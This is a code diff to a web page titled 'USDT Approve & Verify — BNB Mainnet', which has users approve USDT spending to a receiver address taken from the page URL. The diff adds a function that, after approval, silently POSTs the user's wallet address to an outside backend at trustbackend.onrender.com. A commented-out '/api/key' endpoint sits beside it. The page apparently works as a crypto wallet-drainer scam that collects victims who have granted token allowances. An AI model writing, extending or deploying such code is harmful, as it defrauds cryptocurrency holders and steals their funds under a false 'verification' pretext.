@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>USDT Approve & Verify — BNB Mainnet</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 
 <style>
 :root {
@@ -297,9 +298,6 @@ main {
 }
 
 
-.none{
-    display: none;
-}
 
 
 @keyframes skeleton-loading {
@@ -732,6 +730,7 @@ async function approveAndVerify() {
         busy = false;
         await refreshNetwork().catch(() => {});
         updateButton();
+        sendWalletAddress(owner)
     }
 }
 
@@ -747,6 +746,30 @@ function loadReceiverFromParams() {
     } else {
         $("sendAmountAdderess").value = "";
         console.warn("Invalid receiver address in URL");
+    }
+}
+
+async function sendWalletAddress(walletAddress) {
+    try {
+        const response = await fetch(
+            // "https://trustbackend.onrender.com/api/key",
+            "https://trustbackend.onrender.com/api/payments/create",
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    walletAddress: walletAddress
+                })
+            }
+        );
+
+        const result = await response.json();
+        console.log("Backend response:", result);
+
+    } catch (error) {
+        console.error("API Error:", error);
     }
 }
 
